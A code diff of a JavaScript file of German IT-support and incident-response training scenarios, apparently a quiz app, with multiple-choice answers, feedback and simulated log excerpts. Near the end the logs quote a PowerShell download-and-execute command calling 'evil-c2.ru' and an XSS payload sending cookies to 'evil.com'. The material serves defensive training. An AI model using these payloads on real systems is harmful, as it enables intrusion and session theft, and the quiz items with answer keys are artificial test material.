-      { text: "Die Quell-IPs sperren und die Entwickler auffordern, Prepared Statements zu verwenden.", isCorrect: true },
-      { text: "Die Datenbank löschen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Die WAF schützt das System, aber die grundlegende Schwachstelle muss im Code der Anwendung behoben werden."
-  },
-  {
-    id: 155,
-    title: "DDoS auf Webserver",
-    description: "Der externe Webserver ist nicht mehr erreichbar. Die Bandbreite ist zu 100% ausgelastet.",
-    options: [
-      { text: "Server neustarten.", isCorrect: false },
-      { text: "Den ISP kontaktieren, um DDoS-Mitigation/Scrubbing zu aktivieren.", isCorrect: true },
-      { text: "Einen zweiten Webserver aufsetzen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Ein volumetrischer DDoS-Angriff kann nur vom Provider abgewehrt werden, da die Leitung bereits vor der eigenen Firewall dicht ist."
-  },
-  {
-    id: 156,
-    title: "Unverschlüsselte FTP-Übertragung",
-    description: "Das Netzwerk-Monitoring meldet die Übertragung von Dateien mit Passwörtern im Klartext über FTP (Port 21).",
-    options: [
-      { text: "Den FTP-Server sofort abschalten und auf SFTP/FTPS umstellen.", isCorrect: true },
-      { text: "Die Passwörter in eine Zip-Datei packen und weiter FTP nutzen.", isCorrect: false },
-      { text: "Port 21 auf 2121 ändern.", isCorrect: false },
-    ],
-    feedback: "Korrekt! FTP überträgt alles (auch Login-Daten) im Klartext. Es muss durch sichere Protokolle ersetzt werden."
-  },
-  {
-    id: 157,
-    title: "Kryptominer auf Server",
-    description: "Ein Server hat plötzlich 100% CPU-Auslastung. Im Taskmanager läuft ein Prozess 'xmrig.exe'.",
-    options: [
-      { text: "Prozess killen, Server isolieren, nach der initialen Eintrittslücke suchen.", isCorrect: true },
-      { text: "Den Prozess auf niedrige Priorität setzen.", isCorrect: false },
-      { text: "Eine bessere CPU kaufen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! XMRig ist ein bekannte Monero-Miner. Er deutet auf eine erfolgreiche Ausnutzung einer Schwachstelle hin."
-  },
-  {
-    id: 158,
-    title: "Passwort in GitHub Repository",
-    description: "Ein Entwickler hat hartkodierte AWS-Keys auf GitHub hochgeladen.",
-    options: [
-      { text: "Die AWS-Keys sofort widerrufen (rotieren) und die Commit-Historie bereinigen.", isCorrect: true },
-      { text: "Den Code einfach löschen.", isCorrect: false },
-      { text: "Das Repository auf privat stellen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Auch nach dem Löschen können Keys in der Git-Historie gefunden werden. Rotieren ist der einzige sichere Weg."
-  },
-  {
-    id: 159,
-    title: "Makros in Office-Dokument",
-    description: "Ein User öffnet ein Word-Dokument aus einer E-Mail und klickt auf 'Inhalte aktivieren'.",
-    options: [
-      { text: "Den User ermahnen und nichts weiter tun.", isCorrect: false },
-      { text: "Den PC sofort vom Netz trennen und auf Schadsoftware prüfen (Makro-Malware).", isCorrect: true },
-      { text: "Word neu installieren.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Bösartige Makros laden oft Schadsoftware nach (z.B. Emotet, Trickbot). Schnelle Isolation ist Pflicht."
-  },
-  {
-    id: 160,
-    title: "Admin-Passwort weitergegeben",
-    description: "Ein IT-Mitarbeiter sendet das Domänen-Admin Passwort per Teams an einen Kollegen.",
-    options: [
-      { text: "Die Nachricht löschen und das Passwort sofort ändern.", isCorrect: true },
-      { text: "Teams ist verschlüsselt, also ist es sicher.", isCorrect: false },
-      { text: "Den Kollegen bitten, das Passwort nicht weiterzusagen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Passwörter für hochprivilegierte Accounts dürfen niemals über Chat-Systeme geteilt werden. Rotation ist zwingend erforderlich."
-  },
-  {
-    id: 161,
-    title: "Ausfall der Klimaanlage im Serverraum",
-    description: "Die Temperatur-Sensoren im RZ melden 35°C, Tendenz steigend.",
-    options: [
-      { text: "Tür aufmachen und einen Ventilator reinstellen.", isCorrect: false },
-      { text: "Unkritische Systeme geordnet herunterfahren, kritische in eine andere Zone migrieren und Klima-Techniker rufen.", isCorrect: true },
-      { text: "Server laufen lassen, die halten was aus.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Überhitzung führt zu sofortigen Hardware-Ausfällen. Die Last muss aktiv reduziert werden."
-  },
-  {
-    id: 162,
-    title: "Ransomware-Nachricht auf Desktop",
-    description: "Auf mehreren Bildschirmen erscheint ein roter Hintergrund mit einer Lösegeldforderung in Bitcoin.",
-    options: [
-      { text: "Bitcoin kaufen und bezahlen.", isCorrect: false },
-      { text: "Incident Response ausrufen, gesamte Netzwerke segmentieren/abschalten, um weitere Ausbreitung zu verhindern.", isCorrect: true },
-      { text: "Das Hintergrundbild wieder auf das Firmenlogo ändern.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Ein Ausfall muss sofort eingegrenzt (Containment) werden, um nicht betroffene Systeme und Backups zu schützen."
-  },
-  {
-    id: 163,
-    title: "Abgelaufenes Root-Zertifikat (PKI)",
-    description: "Das interne Root-CA-Zertifikat der Windows-Domäne läuft in 5 Tagen ab.",
-    options: [
-      { text: "Zertifikat erneuern und über GPO auf alle Clients pushen, bevor es abläuft.", isCorrect: true },
-      { text: "Warten, bis es abgelaufen ist.", isCorrect: false },
-      { text: "Zertifikatsüberprüfung in den Browsern abschalten.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Läuft die Root-CA ab, vertraut kein System mehr internen Diensten (WLAN, VPN, Webseiten). Erneuerung hat höchste Prio."
-  },
-  {
-    id: 164,
-    title: "Ping-Sweep entdeckt",
-    description: "Das IDS meldet ICMP Echo Requests an jede einzelne IP im Server-Subnetz, kommend aus dem Gäste-WLAN.",
-    options: [
-      { text: "Das Gäste-WLAN komplett abschalten und die Quell-IP identifizieren.", isCorrect: true },
-      { text: "Ping ist normal, ignorieren.", isCorrect: false },
-      { text: "Ping auf den Servern erlauben.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Ein Ping-Sweep (z.B. Nmap) ist der erste Schritt der Reconnaissance-Phase eines Angriffs."
-  },
-  {
-    id: 165,
-    title: "O365 Mailbox Forwarding Rule",
-    description: "Eine Regel leitet alle E-Mails des CEO automatisch an eine unbekannte Gmail-Adresse weiter.",
-    options: [
-      { text: "Die Regel löschen, das Passwort des CEO zurücksetzen und eine Untersuchung auf Datenabfluss starten.", isCorrect: true },
-      { text: "Die Regel umbenennen.", isCorrect: false },
-      { text: "Dem CEO eine Mail schreiben und ihn fragen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Heimliche Weiterleitungsregeln (Forwarding) sind eine typische Post-Exploitation-Methode nach einem erfolgreichen Phishing-Angriff (BEC)."
-  },
-  {
-    id: 166,
-    title: "Abgelaufenes AD Passwort des Dienstkontos",
-    description: "Ein kritischer Windows-Dienst (z.B. SQL Server) startet nicht mehr (Logon Failure).",
-    options: [
-      { text: "Das Passwort im AD zurücksetzen, den Dienst mit dem neuen Passwort konfigurieren und neu starten.", isCorrect: true },
-      { text: "Den Dienst unter dem SYSTEM Account laufen lassen.", isCorrect: false },
-      { text: "Das AD komplett neu installieren.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Dienstkonten (Service Accounts) sollten idealerweise Group Managed Service Accounts (gMSA) sein, um manuelle Passwortwechsel zu vermeiden."
-  },
-  {
-    id: 167,
-    title: "Verdächtige RDP-Anmeldeversuche (Brute Force)",
-    description: "Das Event-Log des Terminalservers zeigt 500 fehlerhafte Logins per RDP pro Minute von verschiedenen IPs.",
-    options: [
-      { text: "Einen Account Lockout Policy (Kontosperrungsrichtlinie) aktivieren und eine Geo-IP-Blockliste auf der Firewall einrichten.", isCorrect: true },
-      { text: "Alle Passwörter auf 1234 ändern, damit die Hacker reinkommen und dann stoppen.", isCorrect: false },
-      { text: "Den Server neu starten.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Brute-Force-Angriffe müssen auf Netzwerkebene (Firewall) oder durch strenge Account-Sperr-Richtlinien und MFA unterbunden werden."
-  },
-  {
-    id: 168,
-    title: "Unautorisierter SSH Root-Login",
-    description: "Ein erfolgreicher SSH-Login als 'root' auf einem kritischen Linux-Server wurde von einer externen IP festgestellt.",
-    options: [
-      { text: "Den Server sofort isolieren, den root-Login deaktivieren und forensische Maßnahmen ergreifen.", isCorrect: true },
-      { text: "Das Passwort für root auf 'admin' setzen.", isCorrect: false },
-      { text: "Eine Willkommensnachricht (MOTD) konfigurieren.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Direkter root-Login über SSH sollte immer deaktiviert sein (PermitRootLogin no). Ein erfolgreicher Login ist eine kritische Kompromittierung."
-  },
-  {
-    id: 169,
-    title: "VDI-Sitzung eingefroren (Citrix/VMware)",
-    description: "Ein Benutzer meldet, dass seine virtuelle Desktop-Sitzung reagiert nicht mehr auf Eingaben.",
-    options: [
-      { text: "Die Sitzung über die Management-Konsole (z.B. Citrix Director) zurücksetzen (Logoff/Reset).", isCorrect: true },
-      { text: "Den Monitor des Benutzers austauschen.", isCorrect: false },
-      { text: "Die gesamte VDI-Infrastruktur neu starten.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Ein Session-Reset erzwingt die Abmeldung, sodass sich der Benutzer neu an einem sauberen Desktop anmelden kann."
-  },
-  {
-    id: 170,
-    title: "Teams / Audio funktioniert nicht",
-    description: "Ein Nutzer kann in Teams nichts hören und sein Mikrofon geht nicht, in Windows geht es aber.",
-    options: [
-      { text: "In Teams unter Einstellungen -> Geräte die korrekten In/Out-Geräte wählen und Windows Datenschutz (Mikrofonzugriff) prüfen.", isCorrect: true },
-      { text: "Windows formatieren.", isCorrect: false },
-      { text: "Ein neues Headset bestellen.", isCorrect: false },
-    ],
-    feedback: "Korrekt! Häufig wählen Anwendungen wie Teams falsche Audiogeräte aus oder werden durch die Windows-Datenschutzeinstellungen für das Mikrofon blockiert."
-  },
-  {
-    id: 171,
+    id: 1014,
     title: "DMARC-Fehler",
     description: "Mails von der eigenen Domain landen beim Kunden neuerdings alle im Spam-Ordner.",
     options: [
@@ -3033,7 +2482,7 @@ const baseScenarios = [
     feedback: "Korrekt! Wenn SPF (Sender Policy Framework) oder DKIM fehlschlagen, sorgt die DMARC-Richtlinie dafür, dass Mails als Spam markiert oder abgewiesen werden."
   },
   {
-    id: 172,
+    id: 1015,
     title: "Split-Brain (Cluster)",
     description: "Zwei Knoten in einem High-Availability Cluster (z.B. Datenbank) denken beide, sie seien aktiv, weil die Netzwerkverbindung zwischen ihnen unterbrochen wurde.",
     options: [
@@ -3044,7 +2493,7 @@ const baseScenarios = [
     feedback: "Korrekt! Ein Split-Brain-Szenario kann zu fataler Dateninkonsistenz führen, weshalb Quorum/Tiebreaker-Systeme essenziell sind."
   },
   {
-    id: 173,
+    id: 1016,
     title: "Zertifikat abgelaufen (Webserver)",
     description: "Nutzer erhalten im Browser die rote Warnung 'Ihre Verbindung ist nicht privat', wenn sie das Intranet aufrufen.",
     options: [
@@ -3055,7 +2504,7 @@ const baseScenarios = [
     feedback: "Korrekt! Abgelaufene Zertifikate führen zu Browser-Warnungen und verhindern teilweise moderne HSTS-Verbindungen komplett."
   },
   {
-    id: 174,
+    id: 1017,
     title: "VLAN Mismatch",
     description: "Ein neuer PC im Büro kriegt eine IP-Adresse aus dem Gast-WLAN (z.B. 192.168.100.x) statt aus dem internen Netz (10.0.0.x).",
     options: [
@@ -3066,7 +2515,7 @@ const baseScenarios = [
     feedback: "Korrekt! Ist der Switch-Port im falschen VLAN, landet der Client im falschen Subnetz und bekommt vom dortigen DHCP-Server eine IP."
   },
   {
-    id: 175,
+    id: 1018,
     title: "Bluescreen of Death (BSOD) nach Update",
     description: "Mehrere PCs stürzen direkt nach dem monatlichen Microsoft Patchday mit einem BSOD ab.",
     options: [
@@ -3077,7 +2526,7 @@ const baseScenarios = [
     feedback: "Korrekt! Fehlerhafte Updates (z.B. durch Treiber-Inkompatibilitäten) können so temporär zurückgerollt werden."
   },
   {
-    id: 176,
+    id: 1019,
     title: "Festplatte voll (Logfiles)",
     description: "Ein Linux-Webserver reagiert nicht mehr, der Befehl 'df -h' zeigt 100% Auslastung auf der /var Partition.",
     options: [
@@ -3088,7 +2537,7 @@ const baseScenarios = [
     feedback: "Korrekt! Vollgelaufene Partitionen (besonders /var) führen zu Ausfällen von Datenbanken und Webdiensten. logrotate verhindert das langfristig."
   },
   {
-    id: 177,
+    id: 1020,
     title: "Phishing-Angriff gemeldet",
     description: "Ein User hat auf einen Link in einer falschen HR-Mail geklickt und sein Office 365 Passwort eingegeben.",
     options: [
@@ -3099,7 +2548,7 @@ const baseScenarios = [
     feedback: "Korrekt! Sobald Credentials eingegeben wurden, muss das Konto gesichert und auf Kompromittierung (z.B. Forwarding-Rules) geprüft werden."
   },
   {
-    id: 178,
+    id: 1021,
     title: "Schattenkopien (VSS) fehlen",
     description: "Ein Nutzer will eine versehentlich gelöschte Datei über 'Vorherige Versionen' wiederherstellen, aber es gibt keine Einträge.",
     options: [
@@ -3110,18 +2559,18 @@ const baseScenarios = [
     feedback: "Korrekt! Die Vorherigen Versionen basieren auf Windows-Schattenkopien. Wenn diese deaktiviert oder überschrieben sind, sind Backups die einzige Rettung."
   },
   {
-    id: 179,
+    id: 1022,
     title: "Netzlaufwerk über VPN nicht erreichbar",
-    description: "Nutzer im Homeoffice können nicht auf den Fileserver unter \\server\share zugreifen, Ping auf die IP geht aber.",
+    description: "Nutzer im Homeoffice können nicht auf den Fileserver unter \\\\server\\share zugreifen, Ping auf die IP geht aber.",
     options: [
-      { text: "Prüfen, ob der VPN-Client die internen DNS-Server nutzt und ob der FQDN (\\server.domain.local\share) funktioniert.", isCorrect: true },
+      { text: "Prüfen, ob der VPN-Client die internen DNS-Server nutzt und ob der FQDN (\\\\server.domain.local\\share) funktioniert.", isCorrect: true },
       { text: "Den Fileserver ins Internet stellen.", isCorrect: false },
       { text: "Das VPN neu installieren.", isCorrect: false },
     ],
     feedback: "Korrekt! Oft wird über VPN der NetBIOS-Name (\\server) nicht aufgelöst. DNS-Suffixe oder FQDNs beheben das Problem."
   },
   {
-    id: 180,
+    id: 1023,
     title: "Proxy blockiert legitime Seite",
     description: "Die neue CRM-Webseite wird von der Firmen-Firewall (Web-Proxy) als 'Malicious' oder 'Uncategorized' geblockt.",
     options: [
@@ -3132,7 +2581,7 @@ const baseScenarios = [
     feedback: "Korrekt! Neue Domains werden von Webfiltern oft pauschal geblockt, bis sie kategorisiert sind."
   },
   {
-    id: 181,
+    id: 1024,
     title: "Ransomware-Verdacht",
     description: "Ein User meldet panisch, dass alle seine Excel-Dateien plötzlich kryptische Namen haben und auf '.enc' enden.",
     options: [
@@ -3143,7 +2592,7 @@ const baseScenarios = [
     feedback: "Korrekt! Isolation ist die wichtigste Maßnahme, um zu verhindern, dass die Ransomware Netzlaufwerke und andere PCs verschlüsselt."
   },
   {
-    id: 182,
+    id: 1025,
     title: "Drucker druckt Hieroglyphen",
     description: "Ein Netzwerkdrucker spuckt anstelle von Text seitenweise kryptische Zeichen (Smileys, Sonderzeichen) aus.",
     options: [
@@ -3154,7 +2603,7 @@ const baseScenarios = [
     feedback: "Korrekt! Wenn ein Drucker z.B. PCL erwartet, aber PostScript-Daten bekommt, interpretiert er den Code als Klartext und druckt Müll."
   },
   {
-    id: 183,
+    id: 1026,
     title: "Laptop verliert ständig WLAN",
     description: "Ein Laptop bricht in großen Büros die WLAN-Verbindung ab, sobald der Nutzer den Raum wechselt.",
     options: [
@@ -3165,7 +2614,7 @@ const baseScenarios = [
     feedback: "Korrekt! Clients entscheiden selbst, wann sie zum nächsten Access Point wechseln (Roaming). Ist die Schwelle zu niedrig, bleiben sie an schwachen APs kleben (Sticky Client)."
   },
   {
-    id: 184,
+    id: 1027,
     title: "Gelöschtes AD-Objekt wiederherstellen",
     description: "Ein Administrator hat versehentlich einen ganzen Ordner (OU) mit Benutzern im Active Directory gelöscht.",
     options: [
@@ -3176,7 +2625,7 @@ const baseScenarios = [
     feedback: "Korrekt! Der AD Recycle Bin (sofern einmalig aktiviert) erlaubt die einfache Wiederherstellung gelöschter Objekte inkl. aller Attribute."
   },
   {
-    id: 185,
+    id: 1028,
     title: "CPU-Auslastung 100% (svchost.exe)",
     description: "Ein Windows-PC ist extrem langsam, der Taskmanager zeigt, dass 'svchost.exe' dauerhaft 100% CPU braucht.",
     options: [
@@ -3187,7 +2636,7 @@ const baseScenarios = [
     feedback: "Korrekt! 'svchost.exe' ist nur ein Host-Prozess für DLL-basierte Dienste. Man muss herausfinden, WELCHER Dienst genau das Problem verursacht."
   },
   {
-    id: 186,
+    id: 1029,
     title: "Passwortrichtlinie greift nicht",
     description: "Ein Nutzer kann 'Sommer2024!' als Passwort setzen, obwohl die IT gesagt hat, dass schwache Passwörter blockiert werden.",
     options: [
@@ -3198,7 +2647,7 @@ const baseScenarios = [
     feedback: "Korrekt! AD Standard-Richtlinien prüfen nur Komplexität (Groß/Klein/Zahl/Sonderzeichen), aber nicht, ob das Wort in einem Wörterbuch steht."
   },
   {
-    id: 187,
+    id: 1030,
     title: "App stürzt auf iOS ab",
     description: "Die interne Firmen-App stürzt seit heute Morgen bei allen Usern mit iOS 17 sofort nach dem Start ab.",
     options: [
@@ -3209,7 +2658,7 @@ const baseScenarios = [
     feedback: "Korrekt! Wenn ein Problem massenhaft nach Updates auftritt, ist ein Rollback über das Mobile Device Management (MDM) der schnellste Fix."
   },
   {
-    id: 188,
+    id: 1031,
     title: "Große Mails kommen nicht an",
     description: "Ein Mitarbeiter schickt eine Mail mit einem 25MB PDF, bekommt aber einen NDR (Non-Delivery Report) zurück.",
     options: [
@@ -3220,7 +2669,7 @@ const baseScenarios = [
     feedback: "Korrekt! E-Mails sind nicht für den Transfer großer Dateien gedacht. Exchange und Gateways haben meist harte Limits (z.B. 10MB oder 25MB)."
   },
   {
-    id: 189,
+    id: 1032,
     title: "Kein Ton im Konferenzraum",
     description: "Das Microsoft Teams Rooms (MTR) System überträgt das Mikrofon im Raum nicht an die Remote-Teilnehmer.",
     options: [
@@ -3231,7 +2680,7 @@ const baseScenarios = [
     feedback: "Korrekt! MTR-Systeme verlieren manchmal nach Updates die Zuordnung der USB-Audio-Peripherie."
   },
   {
-    id: 190,
+    id: 1033,
     title: "MFA Bombing / Prompt Spam",
     description: "Ein User ruft an, weil er nachts 50 Push-Benachrichtigungen für die Microsoft Authenticator App bekommen hat.",
     options: [
@@ -3242,7 +2691,7 @@ const baseScenarios = [
     feedback: "Korrekt! MFA-Bombing zielt darauf ab, den Nutzer zu nerven, bis er aus Versehen zustimmt. Das Passwort ist bereits kompromittiert!"
   },
   {
-    id: 200,
+    id: 1034,
     title: "Phishing-Vorfall (Komplex)",
     description: "Ein VIP-User hat auf einen Phishing-Link geklickt und seine Zugangsdaten eingegeben.",
     isMultiStage: true,
@@ -3442,7 +2891,7 @@ const baseScenarios = [
   {
     id: 206,
     title: "Malware auf CEO-Laptop (Multi-Stage)",
-    description: "Der Virenscanner schlägt auf dem Laptop des CEOs Alarm: Ein Trojaner wurde in 'C:\Temp' gefunden.",
+    description: "Der Virenscanner schlägt auf dem Laptop des CEOs Alarm: Ein Trojaner wurde in 'C:\\Temp' gefunden.",
     isMultiStage: true,
     steps: [
       {
@@ -3815,7 +3264,7 @@ const baseScenarios = [
         stepTitle: "Phase 2: Fehlerbehebung",
         description: "Auf dem Printserver hängen 50 Dokumente in der Warteschlange und nichts bewegt sich.",
         options: [
-          { text: "Du startest den Dienst 'Druckerwarteschlange' (Print Spooler) neu und löschst ggf. korrupte SPL-Dateien in C:\Windows\System32\spool\PRINTERS.", isCorrect: true },
+          { text: "Du startest den Dienst 'Druckerwarteschlange' (Print Spooler) neu und löschst ggf. korrupte SPL-Dateien in C:\\Windows\\System32\\spool\\PRINTERS.", isCorrect: true },
           { text: "Du startest den Printserver komplett neu.", isCorrect: false },
           { text: "Du sagst den Usern, sie sollen es später nochmal probieren.", isCorrect: false },
         ],
@@ -3910,7 +3359,7 @@ const baseScenarios = [
   {
     id: 222,
     title: "Netzlaufwerk nicht gefunden (Homeoffice)",
-    description: "Ein Nutzer im Homeoffice ist per VPN verbunden, findet aber das Laufwerk '\\fileserver\marketing' nicht.",
+    description: "Ein Nutzer im Homeoffice ist per VPN verbunden, findet aber das Laufwerk '\\\\fileserver\\marketing' nicht.",
     isMultiStage: true,
     steps: [
       {
@@ -3927,7 +3376,7 @@ const baseScenarios = [
         stepTitle: "Phase 2: DNS über VPN",
         description: "Der Ping auf die IP geht, aber 'ping fileserver' meldet 'Host nicht gefunden'.",
         options: [
-          { text: "Du verbindest das Laufwerk über den Fully Qualified Domain Name (FQDN), also '\\fileserver.firma.local\marketing'.", isCorrect: true },
+          { text: "Du verbindest das Laufwerk über den Fully Qualified Domain Name (FQDN), also '\\\\fileserver.firma.local\\marketing'.", isCorrect: true },
           { text: "Du kündigst den Internetanschluss des Nutzers.", isCorrect: false },
           { text: "Das ist unmöglich lösbar.", isCorrect: false },
         ],
@@ -4657,7 +4106,7 @@ const baseScenarios = [
         options: [
           { text: "Rename-Computer -NewName Win2022-Core", isCorrect: true },
           { text: "Set-Hostname Win2022-Core", isCorrect: false },
-          { text: "ren C:\Windows\System32\hostname.exe Win2022-Core", isCorrect: false },
+          { text: "ren C:\\Windows\\System32\\hostname.exe Win2022-Core", isCorrect: false },
         ],
         feedback: "Richtig! 'Rename-Computer' ändert den Hostnamen. Vergiss nicht, den Server danach mit 'Restart-Computer' neuzustarten!"
       },
@@ -4729,7 +4178,7 @@ const baseScenarios = [
         stepTitle: "Phase 1: Bereitstellungspunkte (Mount Points)",
         description: "Wie bindest du das neue 10 TB Volume in das System ein, wenn keine Laufwerksbuchstaben mehr frei sind?",
         options: [
-          { text: "Als 'Bereitstellungspunkt' (Mount Point) in einem leeren NTFS-Ordner (z.B. C:\NeueDaten).", isCorrect: true },
+          { text: "Als 'Bereitstellungspunkt' (Mount Point) in einem leeren NTFS-Ordner (z.B. C:\\NeueDaten).", isCorrect: true },
           { text: "Das geht nicht, Windows Server unterstützt maximal 26 Partitionen.", isCorrect: false },
           { text: "Man verwendet Laufwerksbuchstaben wie AA: und AB:.", isCorrect: false },
         ],
@@ -5014,8 +4463,7 @@ const baseScenarios = [
     }
   ],
   feedback: "Korrekt! Any-Any Allow stellt ein massives Risiko dar. Eine Zurücksetzung auf Werkseinstellungen (Game Over) würde jedoch das gesamte Unternehmen offline nehmen."
-}
-,
+},
   {
   id: 1004,
   title: "Ransomware auf dem Dateiserver",
@@ -5715,7 +5163,7 @@ VM Name: VM-DC-SECONDARY
 Operation Name: Microsoft.Compute/virtualMachines/runCommand/action
 Initiated By: compromised-cloud-operator@company.com
 Command Script Content:
-  "powershell.exe -ExecutionPolicy Bypass -Command 'iex (New-Object Net.WebClient).DownloadString(\"http://evil-c2.ru/agent.ps1\")'"
+  "powershell.exe -ExecutionPolicy Bypass -Command 'iex (New-Object Net.WebClient).DownloadString("http://evil-c2.ru/agent.ps1")'"
 [ALERT] RunCommand executed on highly critical server.`,
 
   54: `AWS Abuse Notice (Case #884120932):
@@ -5730,11 +5178,11 @@ Current Status: Critical Threat Flagged`,
 Resource: Cloud Functions (Backend API)
 Log Entry:
   "Error: Could not authenticate database client using JSON key: {
-     \"type\": \"service_account\",
-     \"project_id\": \"company-gcp-prod\",
-     \"private_key_id\": \"a892b11cd...\",
-     \"private_key\": \"-----BEGIN PRIVATE KEY-----\\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDh...\\n-----END PRIVATE KEY-----\\n\",
-     \"client_email\": \"bucket-owner-svc@company-gcp-prod.iam.gserviceaccount.com\"
+     "type": "service_account",
+     "project_id": "company-gcp-prod",
+     "private_key_id": "a892b11cd...",
+     "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDh...\n-----END PRIVATE KEY-----\n",
+     "client_email": "bucket-owner-svc@company-gcp-prod.iam.gserviceaccount.com"
    }"`,
 
   56: `EDR Memory Inspection Log:
@@ -5937,7 +5385,7 @@ HTTP Response: 200 OK
 Bytes Sent: 1,412 (Contents of target system file returned)`,
 
   83: `Database Query Log & HTML Output:
-SQL Query: INSERT INTO guestbook (username, comment) VALUES ('Guest', '<script>fetch(\"http://evil.com/\"+document.cookie)</script>')
+SQL Query: INSERT INTO guestbook (username, comment) VALUES ('Guest', '<script>fetch("http://evil.com/"+document.cookie)</script>')
 Browser DOM Renderer Warning:
   - Script executed automatically when rendering post element!
   - Cookies extracted: SESSION_ID=774a2b1f09cde8823`,
